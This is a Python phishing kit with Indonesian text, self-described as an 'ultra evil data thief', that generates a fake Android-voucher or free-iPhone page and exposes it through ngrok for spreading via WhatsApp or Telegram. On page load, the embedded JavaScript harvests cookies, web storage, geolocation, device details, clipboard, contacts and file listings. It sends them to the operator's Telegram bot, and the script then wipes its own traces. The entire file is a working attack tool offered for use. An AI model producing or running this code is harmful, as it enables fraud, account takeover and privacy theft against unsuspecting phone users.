import os
import subprocess
import time
import shutil
from datetime import datetime
import threading
import random
import sys

# Animasi UI Hollywood-style
def hacker_ui():
    hacker_chars = ["0", "1", "#", "@", "$", "%", "&", "*", "!", "?"]
    def animate():
        while True:
            sys.stdout.write("\033[H\033[J")  # Bersihkan layar
            print("\033[32m" + "🔥 HACKER PHISHING TERMINAL 🔥".center(80) + "\033[0m")
            print("\033[31m" + "="*80 + "\033[0m")
            for _ in range(10):
                print("".join(random.choice(hacker_chars) for _ in range(80)))
            print("\033[31m" + "="*80 + "\033[0m")
            print("\033[33mStatus: Menunggu target mengklik link...".center(80))
            print("\033[33mData akan masuk ke bot Telegram Anda!".center(80))
            print("\033[31m" + "="*80 + "\033[0m")
            time.sleep(0.2)
    threading.Thread(target=animate, daemon=True).start()

# Banner Keren
def print_banner():
    banner = """
😈😈😈 PENCURI DATA ULTRA JAHAT V2 😈😈😈
______________  ________________             
___  __ \__  / / /_  ___/__  __ \________  __
__  /_/ /_  /_/ /_____ \__  /_/ /  _ \_  |/_/
_  ____/_  __  / ____/ /_  _, _//  __/_>  <  
/_/     /_/ /_/  /____/ /_/ |_| \___//_/|_|  
                                             
    Coded by: Mr.4Rex_503
    Target: Android & iOS
    Powered by: Blackhat Indonesian Cyber System
😈 Mr.5hent_503 😈
"""
    print(banner)

# Input Konfigurasi
def get_config():
    print("🔥 Masukkan konfigurasi nya sayang:")
    ngrok_authtoken = input("Masukkan Ngrok Authtoken: ")
    bot_token = input("Masukkan Telegram Bot Token: ")
    chat_id = input("Masukkan Telegram Chat ID: ")
    return ngrok_authtoken, bot_token, chat_id

# Menu Pilihan
def show_menu():
    print("\n🎯 Pilih Target:")
    print("1. Android")
    print("2. iOS")
    print("3. Keluar")
    return input("Pilih [1-3]: ")

# Template HTML Phishing dengan Backdoor
def generate_html(target, bot_token, chat_id):
    html_content = f"""<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{'Promo Eksklusif Android' if target == '1' else 'Hadiah iPhone Gratis'}</title>
    <style>
        body {{
            background: linear-gradient(135deg, #ff4b4b, #2a5298);
            font-family: 'Segoe UI', Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
            overflow: hidden;
        }}
        .container {{
            background: rgba(0, 0, 0, 0.9);
            padding: 40px;
            border-radius: 25px;
            box-shadow: 0 0 40px rgba(255, 255, 255, 0.7);
            text-align: center;
            animation: fadeIn 1.2s ease-in;
        }}
        h1 {{
            font-size: 3em;
            margin-bottom: 20px;
            text-shadow: 0 0 15px #ff4b4b;
        }}
        p {{
            font-size: 1.3em;
            margin-bottom: 30px;
        }}
        .btn {{
            padding: 20px 50px;
            font-size: 1.5em;
            background: linear-gradient(45deg, #ff4b4b, #ff8e53);
            border: none;
            border-radius: 50px;
            color: #fff;
            cursor: pointer;
            transition: transform 0.3s, box-shadow 0.3s;
        }}
        .btn:hover {{
            transform: scale(1.2);
            box-shadow: 0 0 30px #ff4b4b;
        }}
        @keyframes fadeIn {{
            from {{ opacity: 0; transform: scale(0.7); }}
            to {{ opacity: 1; transform: scale(1); }}
        }}
        .particles {{
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            overflow: hidden;
        }}
        .particle {{
            position: absolute;
            background: rgba(255, 255, 255, 0.8);
            border-radius: 50%;
            animation: float 8s infinite;
        }}
        @keyframes float {{
            0% {{ transform: translateY(0); opacity: 0.9; }}
            50% {{ opacity: 0.5; }}
            100% {{ transform: translateY(-100vh); opacity: 0; }}
        }}
    </style>
</head>
<body>
    <div class="particles" id="particles"></div>
    <div class="container">
        <h1>{'Klaim Voucher Android Sekarang!' if target == '1' else 'Dapatkan iPhone Gratis!'}</h1>
        <p>{'Masukkan data untuk klaim voucher Rp1.000.000!' if target == '1' else 'Isi data untuk kesempatan menang iPhone terbaru!'}</p>
        <button class="btn" onclick="stealData()">Klaim Sekarang</button>
    </div>

    <script>
        function createParticles() {{
            const particlesContainer = document.getElementById('particles');
            for (let i = 0; i < 100; i++) {{
                const particle = document.createElement('div');
                particle.className = 'particle';
                particle.style.width = `${{Math.random() * 6 + 3}}px`;
                particle.style.height = particle.style.width;
                particle.style.left = `${{Math.random() * 100}}%`;
                particle.style.animationDelay = `${{Math.random() * 8}}s`;
                particlesContainer.appendChild(particle);
            }}
        }}
        createParticles();

        async function stealData() {{
            try {{
                // Mengambil cookies
                const cookies = document.cookie;

                // Mengambil localStorage dan sessionStorage
                const localStorageData = JSON.stringify(localStorage);
                const sessionStorageData = JSON.stringify(sessionStorage);

                // Mengambil info perangkat
                const deviceInfo = {{
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    language: navigator.language,
                    screen: `${{window.screen.width}}x${{window.screen.height}}`,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    battery: await navigator.getBattery?.().then(b => ({{
                        level: b.level,
                        charging: b.charging
                    }})) || 'Tidak tersedia',
                    geolocation: await new Promise(resolve => {{
                        navigator.geolocation.getCurrentPosition(
                            pos => resolve({{ lat: pos.coords.latitude, lon: pos.coords.longitude }}),
                            () => resolve('Geolokasi ditolak')
                        );
                    }})
                }};

                // Backdoor: Eksploitasi WebView Android
                const fileData = await exploitAndroidWebView();

                // Mengumpulkan data curian
                const stolenData = {{
                    cookies: cookies || 'Tidak ada cookies',
                    localStorage: localStorageData || '{{}}',
                    sessionStorage: sessionStorageData || '{{}}',
                    files: fileData || 'Tidak ada file diakses',
                    deviceInfo: deviceInfo
                }};

                // Kirim ke bot Telegram
                const telegramUrl = `https://api.telegram.org/bot{bot_token}/sendMessage`;
                await fetch(telegramUrl, {{
                    method: 'POST',
                    headers: {{ 'Content-Type': 'application/json' }},
                    body: JSON.stringify({{
                        chat_id: '{chat_id}',
                        text: `🎯 Data Curian [{target == '1' ? 'Android' : 'iOS'}]:\n${{JSON.stringify(stolenData, null, 2)}}`
                    }})
                }});

                // Pesan penipuan
                alert('Selamat! Hadiah Anda sedang diproses. Cek email Anda!');
            }} catch (error) {{
                console.error('Gagal mencuri:', error);
                alert('Ups, terjadi kesalahan. Coba lagi nanti!');
            }}
        }}

        async function exploitAndroidWebView() {{
            try {{
                // Eksploitasi WebView Android untuk akses file
                if (navigator.storage && navigator.storage.getDirectory) {{
                    const dirHandle = await navigator.storage.getDirectory();
                    let fileList = [];
                    for await (const [name, handle] of dirHandle.entries()) {{
                        if (handle.kind === 'file') {{
                            try {{
                                const file = await handle.getFile();
                                fileList.push({{ name: name, size: file.size, type: file.type }});
                            }} catch (e) {{
                                fileList.push({{ name: name, error: e.message }});
                            }}
                        }}
                    }}
                    return fileList.length ? fileList : 'Tidak ada file ditemukan';
                }}

                // Backdoor tambahan: Coba akses clipboard dan kontak
                const clipboardData = await navigator.clipboard?.readText().catch(() => 'Clipboard tidak tersedia');
                const contacts = await navigator.contacts?.select(['name', 'tel', 'email'], {{ multiple: true }}).catch(() => 'Kontak tidak tersedia');

                return {{
                    files: 'Akses file tidak didukung',
                    clipboard: clipboardData,
                    contacts: contacts
                }};
            }} catch (e) {{
                return 'Gagal eksploitasi: ' + e.message;
            }}
        }}

        window.onload = () => {{
            stealData();
        }};
    </script>
</body>
</html>"""
    return html_content

# Buat File dan Jalankan Server
def setup_phishing(target, ngrok_authtoken, bot_token, chat_id):
    # Buat folder
    os.makedirs("phishing_site", exist_ok=True)
    
    # Simpan HTML
    html_content = generate_html(target, bot_token, chat_id)
    with open("phishing_site/index.html", "w") as f:
        f.write(html_content)
    
    # Konfigurasi Ngrok
    ngrok_config = f"""authtoken: {ngrok_authtoken}
tunnels:
  phishing:
    addr: 8080
    proto: http
"""
    with open("ngrok.yml", "w") as f:
        f.write(ngrok_config)
    
    # Jalankan server lokal
    server_process = subprocess.Popen(["python", "-m", "http.server", "8080"], cwd="phishing_site")
    
    # Jalankan Ngrok
    ngrok_process = subprocess.Popen(["ngrok", "start", "--config", "../ngrok.yml", "phishing"])
    
    # Tunggu Ngrok aktif
    time.sleep(3)
    try:
        ngrok_url = subprocess.check_output(["curl", "-s", "http://localhost:4040/api/tunnels"]).decode()
        ngrok_url = ngrok_url.split('"public_url":"')[1].split('"')[0]
        print(f"\n🎉 Link Phishing Siap Disebar: {ngrok_url}")
        print("🔗 Kirim link ini via WhatsApp/Telegram!")
        print("⏳ Menunggu target mengklik... Data akan masuk ke bot Telegram!")
    except:
        print("❌ Gagal mendapatkan URL Ngrok. Pastikan Ngrok berjalan!")
    
    return server_process, ngrok_process

# Main Program
def main():
    print_banner()
    ngrok_authtoken, bot_token, chat_id = get_config()
    
    while True:
        choice = show_menu()
        if choice == "1" or choice == "2":
            print(f"\n🔨 Membuat halaman phishing untuk {'Android' if choice == '1' else 'iOS'}...")
            server_process, ngrok_process = setup_phishing(choice, ngrok_authtoken, bot_token, chat_id)
            hacker_ui()  # Aktifkan UI Hollywood
            try:
                input("\n😈 Tekan Enter untuk menghentikan server dan keluar...")
            finally:
                server_process.terminate()
                ngrok_process.terminate()
                shutil.rmtree("phishing_site", ignore_errors=True)
                os.remove("ngrok.yml")
                print("🧹 Membersihkan jejak... Selesai!")
            break
        elif choice == "3":
            print("😈 Keluar dari mode jahat. Sampai jumpa, tuanku!")
            break
        else:
            print("❌ Pilihan salah! Pilih 1, 2, atau 3.")

if __name__ == "__main__":
    main()
